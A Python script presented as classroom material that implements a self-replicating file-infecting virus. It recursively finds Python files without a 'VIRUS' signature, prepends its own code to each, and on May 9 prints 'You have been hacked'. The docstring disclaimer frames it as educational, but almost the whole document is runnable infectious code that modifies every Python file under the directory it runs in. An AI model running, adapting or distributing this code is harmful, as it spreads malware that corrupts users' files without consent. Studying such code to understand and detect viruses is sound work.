#!/usr/bin/python3
# Author:       Rodolfo Gonzalez
# Date:         12-15-2023

""" This code is a demonstration of how a simple file-infecting virus might be structured in Python. 
It's crucial to emphasize that writing, using, or distributing such code is unethical and illegal in many jurisdictions. 
This should only be used for educational purposes and should not be executed in any real environment. This code was given to me in class material."""

import os
import datetime

# Define a signature to mark infected files
SIGNATURE = "VIRUS"

def locate(path):
    # Function to find and return a list of uninfected Python files
    files_targeted = []
    filelist = os.listdir(path) # List all files and directories in the path
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If it's a directory, recursively search within it
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # Check only Python files for infection
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    # If the signature is found, the file is already infected
                    infected = True
                    break
            if not infected:
                # Add uninfected Python files to the list
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    # Function to infect uninfected Python files
    virus = open(os.path.abspath(__file__)) # Open the current file (the virus)
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            # Read the first 39 lines of the virus
            virusstring += line
    virus.close()
    for fname in files_targeted:
        # Write the virus to each target file
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp) # Prepend the virus code
        f.close()

def detonate():
    # Function to trigger an action on a specific date
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If it's May 9th, print a message
        print("You have been hacked")

# Main execution flow
files_targeted = locate(os.path.abspath("")) # Locate uninfected Python files
infect(files_targeted) # Infect them
detonate() # Check the date and trigger the payload if conditions are met
